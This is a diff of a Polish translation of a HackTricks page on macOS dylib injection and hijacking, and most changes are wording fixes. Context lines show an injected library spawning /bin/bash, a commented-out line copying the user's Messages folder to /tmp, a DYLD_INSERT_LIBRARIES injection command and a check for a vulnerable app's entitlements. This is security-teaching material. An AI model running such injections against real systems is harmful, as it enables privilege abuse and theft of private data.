@@ -35,7 +35,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Binary do ataku:
+Binary do zaatakowania:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -50,12 +50,12 @@ Wstrzyknięcie:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Przykład Dyld Hijacking
+## Dyld Hijacking Example
 
-Celem jest podatny binarny plik `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
+Docelowy podatny plik binarny to `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {% tabs %}
-{% tab title="uprawnienia" %}
+{% tab title="entitlements" %}
 <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>[...]com.apple.security.cs.disable-library-validation[...]
 </strong></code></pre>
@@ -169,7 +169,7 @@ Fajny artykuł na temat tego, jak wykorzystać tę lukę do nadużycia uprawnie�
 
 ## Większa skala
 
-Jeśli planujesz spróbować wstrzykiwać biblioteki w niespodziewane binaria, możesz sprawdzić komunikaty zdarzeń, aby dowiedzieć się, kiedy biblioteka jest ładowana w procesie (w tym przypadku usuń printf i wykonanie `/bin/bash`).
+Jeśli planujesz spróbować wstrzyknąć biblioteki w niespodziewane binaria, możesz sprawdzić komunikaty zdarzeń, aby dowiedzieć się, kiedy biblioteka jest ładowana w procesie (w tym przypadku usuń printf i wykonanie `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
@@ -183,7 +183,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
+* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
 </details>
 {% endhint %}
